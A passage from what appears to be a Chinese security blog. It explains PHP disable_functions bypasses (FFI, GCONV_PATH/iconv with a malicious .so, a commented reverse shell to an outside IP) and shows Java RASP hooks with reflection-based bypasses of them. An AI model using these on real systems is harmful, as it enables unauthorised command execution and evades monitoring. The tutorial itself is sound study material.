<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; /tmp/123&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/123&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/123&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>FFI::cdef用于说明函数的原型，然后把参数传进去。然后直接访问就可以得到flag。</p>
<h2 id="payload-–-蚁剑-4"><a href="#payload-–-蚁剑-4" class="headerlink" title="payload – 蚁剑"></a>payload – 蚁剑</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230827192753441.png"
                      alt="image-20230827192753441"
                ></p>
<h1 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Linux 操作系统</p>
<p>putenv</p>
<p>iconv（可选）</p>
<p>存在可写的目录, 需要上传 .so 文件</p>
<p>给我的感觉和 LD_PRELOAD 的绕过方法差不多</p>
<h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><h3 id="存在-iconv-函数"><a href="#存在-iconv-函数" class="headerlink" title="存在 iconv() 函数"></a>存在 iconv() 函数</h3><p>上传gconv-modules文件于&#x2F;tmp文件夹，其内容如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">module  自定义字符集名字（大写）//    INTERNAL    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span><br><span class="line">module  INTERNAL    自定义字符集名字（大写）//    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span><br></pre></td></tr></table></figure></div>

<p>如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">module  KOISHI//    INTERNAL    ../../../../../../../../tmp/koishi    2</span><br><span class="line">module  INTERNAL    KOISHI//    ../../../../../../../../tmp/koishi    2</span><br></pre></td></tr></table></figure></div>

<p>再书写koishi.c文件，内容如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;/readflag &gt; /tmp/flag&quot;</span>);</span><br><span class="line">  <span class="comment">// system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.138.0.3/3333 &lt;&amp;1&#x27;&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行shell命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc koishi.c -o koishi.so -shared -fPIC</span><br></pre></td></tr></table></figure></div>

<p>将生成的.so文件上传到&#x2F;tmp。</p>
<p>书写shell.php内容如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;koishi&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>上传到&#x2F;var&#x2F;www&#x2F;html文件夹（web服务根目录）下。使用浏览器访问。此时&#x2F;tmp&#x2F;flag中已经存储了flag值。</p>
<p><strong>总之就是：</strong></p>
<p>上传 so 文件和 gconv-modules 文件到 tmp 目录下</p>
<p>上传 php 文件到web服务根目录下，访问即可在 &#x2F;tmp下生成flag文件</p>
<h3 id="不存在-iconv-函数"><a href="#不存在-iconv-函数" class="headerlink" title="不存在 iconv() 函数"></a>不存在 iconv() 函数</h3><p>前两步相同，</p>
<p>上传 so 文件和 gconv-modules 文件到 tmp 目录下</p>
<p>最后的php文件更换为以下内容，通过文件包含去触发so文件，访问该php文件</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/koishi.so&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>或者</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">iconv__strlen</span>( <span class="string">&quot;1&quot;</span>,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>





<h2 id="payload-–-蚁剑-5"><a href="#payload-–-蚁剑-5" class="headerlink" title="payload – 蚁剑"></a>payload – 蚁剑</h2><p>选择 iconv 后，执行会在web根目录下生成一个 .antproxy.php 文件，密码为 ant。</p>
<p>连接上即可执行命令。</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>java Rasp 的简单实现与绕过</title>
    <url>/2024/03/25/blog_java%20Rasp%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="Rasp-Hook-命令执行函数的攻与防"><a href="#Rasp-Hook-命令执行函数的攻与防" class="headerlink" title="Rasp Hook 命令执行函数的攻与防"></a>Rasp Hook 命令执行函数的攻与防</h2><p>本质上就是 agent 技术</p>
<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>可以简单写一个 agentmain hook 掉 Runtime</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">targetClassName</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(targetClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    instrumentation.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(targetClassName)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = pool.getCtClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">                method.insertBefore(<span class="string">&quot;if(!$1.equals(\&quot;\&quot;))&#123;$1 = \&quot;mspaint\&quot;;&#125;;&quot;</span>);</span><br><span class="line">                method.insertBefore(<span class="string">&quot;System.out.println(\&quot;exec method parameter : \&quot;+ $1 );&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再写个 Demo 使用 agent 查看结果：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_Runtime/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;MainDemo&quot;</span>))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已找到目标类，将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接，并将 agent.jar 发送给虚拟机&quot;</span>);</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 此时 agent 已被使用，尝试调用 Runtime</span></span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;ozxicjiozjcx&quot;</span>);</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现不论我们exec输入什么内容，都会弹出画板，说明hook成功了，我们改成其他内容就可以过滤 Runtime 执行系统命令的内容了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240319101348289.png"
                      alt="image-20240319101348289"
                ></p>
<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><p>在Linux 和 Windows 下对 Runtime 的 exec 方法进行调试。</p>
<p>Windows 下执行命令最终对应的方法是 java.lang.ProcessImpl#create，该方法是 native 方法，通过 idea 无法再深入调试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240319104148722.png"
                      alt="image-20240319104148722"
                ></p>
<p>而在 Linux 下最终在 UNIXProcess 类的初始化方法中调用了 native 方法 forkAndExec。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240319104613603.png"
                      alt="image-20240319104613603"
                ></p>
<p>这俩 native 方法后面再说，通过调用栈可以看到 Runtime 的 exec 方法都经过了 ProcessBuilder 的 start 方法，所以我们 hook Runtime 后其实是可以使用 ProcessBuilder 进行绕过的。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">processBuilder.command(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">processBuilder.start();</span><br></pre></td></tr></table></figure></div>

<p>所以我们可以对 ProcessBuilder 的 start 方法进行修改，这样也可以同时防止通过 Runtime 进行的命令执行</p>
<p>把 transform 小改一下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">       className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (className.equals(targetClassName)) &#123;</span><br><span class="line">           <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">           System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">           <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               clazz = pool.getCtClass(className);</span><br><span class="line">               <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">               method.insertBefore(<span class="string">&quot;this.command.add(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">               method.insertBefore(<span class="string">&quot;this.command.clear();&quot;</span>);</span><br><span class="line">               <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">               <span class="keyword">return</span> bytes;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>这时候执行的所有命令都会变成 calc ，证明方法调用拦截成功。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240319131745046.png"
                      alt="image-20240319131745046"
                ></p>
<h3 id="UNIXProcess-ProcessImpl"><a href="#UNIXProcess-ProcessImpl" class="headerlink" title="UNIXProcess&#x2F;ProcessImpl"></a>UNIXProcess&#x2F;ProcessImpl</h3><p>一般来说RASP技术（OpenRASP）都会hook UNIXProcess&#x2F;ProcessImpl 类来实现对命令执行函数的的监控，因为这里是Java层最底层的类，也是Java层监控的极限，但是攻击者可以反射调用forkAndExec这个native方法或者利用JNI来调用一个自己实现命令执行函数的动态链接库进行利用。JNI 绕过 Rasp 后续再讨论，这里介绍反射的方式。</p>
<h4 id="简单-rasp-检测"><a href="#简单-rasp-检测" class="headerlink" title="简单 rasp 检测"></a>简单 rasp 检测</h4><p>现在我们监控 UNIXProcess&#x2F;ProcessImpl 类，这已经是 Java 层监控的极限了，修改后的 agent 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._ProcessImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] targetClassNameArray = &#123;<span class="string">&quot;java.lang.ProcessImpl&quot;</span> , <span class="string">&quot;java.lang.UNIXProcess&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(clas.getName()))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    instrumentation.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(className)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = pool.getCtClass(className);</span><br><span class="line">                CtConstructor[] method = clazz.getDeclaredConstructors();</span><br><span class="line">                method[<span class="number">0</span>].insertBefore(<span class="string">&quot;&#123;System.out.println(\&quot;&quot;</span>+ className +<span class="string">&quot; 类被初始化\&quot;);&#125;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="Windows-绕过"><a href="#Windows-绕过" class="headerlink" title="Windows 绕过"></a>Windows 绕过</h4><p>对于 Windows 环境，根据上面的内容可以知道调用的是 java.lang.ProcessImpl#create 方法，而这个方法是静态方法，不需要实例化对象就可以调用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240319145212870.png"
                      alt="image-20240319145212870"
                ></p>
<p>以下代码是绕过的例子：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._ProcessImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_Windows_Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_ProcessImpl/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;_Windows_Demo&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;---- 直接调用 Runtime ----&quot;</span>);</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;---- 绕过操作 ----&quot;</span>);</span><br><span class="line">                bypass_hook(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;---- 直接调用 Runtime ----&quot;</span>);</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdstr</span> <span class="operator">=</span> cmd;</span><br><span class="line">        <span class="type">String</span> <span class="variable">envblock</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">long</span>[] stdHandles = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">// 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">create</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="type">long</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        create.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 由于 create 方法是静态方法，甚至都不用实例化对象就行。</span></span><br><span class="line">        create.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以发现成功弹出了计算器，并且通过控制台的输出结果可以发现我们的命令调用并没有被 rasp 拦截到，成功的绕过了检测。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240320220504191.png"
                      alt="image-20240320220504191"
                ></p>
<h4 id="Linux-绕过"><a href="#Linux-绕过" class="headerlink" title="Linux 绕过"></a>Linux 绕过</h4><p>Linux 下主要调用的是 forkAndExec 方法，但是 forkAndExec 并不和 Windows 下的 create 方法那样是静态方法，其函数声明如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240320221410169.png"
                      alt="image-20240320221410169"
                > </p>
<p>正常反射调用 forkAndExec 方法就不能仅通过传入 null 来实现了，需要我们实例化一个 UNIXprocess 对象，而这个实例化操作肯定就会被 rasp 拦截到了，但是我们可以通过 Unsafe 类的 allocateInstance 方法在不调用 UNIXProcess&#x2F;ProcessImpl 构造方法情况下生成实例。以下是绕过 rasp 的方法示例（forkAndExec 参数属实有点多。。。）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_linux</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">           processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe_getObject(processClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="type">Object</span> <span class="variable">launchMechanism</span> <span class="operator">=</span> getFieldValue(processObject, <span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">       <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> ((<span class="type">int</span>) launchMechanism.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanism)) + <span class="number">1</span>;</span><br><span class="line">       <span class="type">byte</span>[] helperpath = getFieldValue(processObject, <span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">       <span class="type">byte</span>[] prog = <span class="keyword">new</span> <span class="title class_">byte</span>[cmd.getBytes().length + <span class="number">1</span>];</span><br><span class="line">       System.arraycopy(cmd.getBytes(), <span class="number">0</span>, prog, <span class="number">0</span>, cmd.getBytes().length);</span><br><span class="line">       <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">       <span class="type">int</span> <span class="variable">argc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">byte</span>[] envBlock = <span class="literal">null</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">envc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">byte</span>[] dir = <span class="literal">null</span>;</span><br><span class="line">       <span class="type">int</span>[] fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="type">Method</span> <span class="variable">forkAndExecMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class,</span><br><span class="line">               <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">       forkAndExecMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       